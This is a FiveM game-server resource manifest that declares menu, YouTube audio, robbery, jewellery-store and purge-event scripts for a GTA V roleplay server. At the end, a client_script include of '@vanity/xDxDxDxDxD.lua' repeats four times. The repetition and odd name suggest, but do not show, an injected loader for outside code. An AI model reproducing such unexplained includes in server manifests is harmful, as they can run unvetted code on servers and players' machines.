fx_version 'adamant'

game 'gta5'

client_scripts {
    "src/client/RMenu.lua",
    "src/client/menu/RageUI.lua",
    "src/client/menu/Menu.lua",
    "src/client/menu/MenuController.lua",

    "src/client/components/*.lua",

    "src/client/menu/elements/*.lua",

    "src/client/menu/items/*.lua",

    "src/client/menu/panels/*.lua",

    "src/client/menu/windows/*.lua",

}

files {
	"client/youtube/API/html/index.html",
	"client/youtube/API/html/scripts/listener.js",
	"client/youtube/API/html/scripts/SoundPlayer.js",
    "client/youtube/API/html/scripts/functions.js",
}


client_scripts {
    'client/youtube/API/client/*.lua',
    'client/youtube/main.lua',
    'config.lua',
    'client/braquage/client.lua',
    'client/bijouteri/client.lua',
    'client/menuevent/menu_client.lua',
    'client/menuevent/event.lua',
    'client/utils/cl.lua',
    'client/purge/purge.lua',


}


server_scripts {
    '@async/async.lua',
    '@mysql-async/lib/MySQL.lua',
    "server/notif/kylian_server.lua",
	'config.lua',
    'server/braquage/server.lua',
    'server/menuevent/server.lua',
    'server/utils/server.lua',
    'client/purge/purge_server.lua',

}

client_script '@vanity/xDxDxDxDxD.lua'

client_script '@vanity/xDxDxDxDxD.lua'

client_script '@vanity/xDxDxDxDxD.lua'

client_script '@vanity/xDxDxDxDxD.lua'